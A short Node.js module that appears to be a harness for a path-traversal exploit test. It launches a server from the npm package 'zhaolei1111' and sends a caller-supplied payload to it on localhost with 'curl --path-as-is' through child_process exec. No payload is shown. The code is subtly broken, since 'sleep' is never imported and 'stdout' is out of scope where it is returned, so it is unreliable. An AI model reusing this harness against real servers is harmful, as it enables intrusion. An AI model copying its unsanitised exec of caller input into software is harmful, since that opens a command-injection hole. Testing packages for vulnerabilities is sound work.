const { exec } = require("child_process");

function exploitFunction(payload) {
  let server = "node ./node_modules/zhaolei1111/index.js";
  let exe = exec(server, (error, stdout) => {
    return stdout;
  });

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8035${payload}"`;
  exe = exec(attack_string, (error, stdout) => {
    return stdout;
  });

  return new Promise((resolve, reject) => {
    exe.on('close', (code) => {
      resolve(code ? 'Error' : stdout);
    });
  });
}

module.exports = { exploitFunction };